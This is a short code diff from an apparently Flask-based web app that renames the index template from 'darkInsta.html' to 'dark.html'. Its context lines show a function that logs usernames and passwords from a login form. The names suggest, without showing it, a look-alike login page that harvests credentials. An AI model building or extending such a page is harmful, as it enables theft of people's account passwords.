@@ -33,7 +33,7 @@ def log_attempt(username, password, success):
 
 @app.route('/')
 def index():
-    return render_template('darkInsta.html')
+    return render_template('dark.html')
 
 @app.route('/login', methods=['POST'])
 def login():
